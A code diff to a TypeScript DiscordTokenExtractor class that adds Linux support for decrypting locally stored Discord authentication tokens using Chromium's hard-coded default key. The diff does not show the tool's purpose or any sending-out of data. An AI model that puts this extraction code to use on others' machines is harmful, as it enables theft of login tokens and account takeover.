@@ -260,6 +260,8 @@ export class DiscordTokenExtractor {
       return this.decryptWindowsToken(encryptedData, discordDir)
     } else if (this.platform === 'darwin') {
       return this.decryptMacToken(encryptedData, discordDir)
+    } else if (this.platform === 'linux') {
+      return this.decryptLinuxToken(encryptedData)
     }
 
     return null
@@ -333,6 +335,11 @@ export class DiscordTokenExtractor {
     }
 
     return null
+  }
+
+  private decryptLinuxToken(encryptedData: Buffer): string | null {
+    const key = pbkdf2Sync('peanuts', 'saltysalt', 1, 16, 'sha1')
+    return this.decryptAESCBC(encryptedData, key)
   }
 
   private decryptAESCBC(encryptedData: Buffer, key: Buffer): string | null {
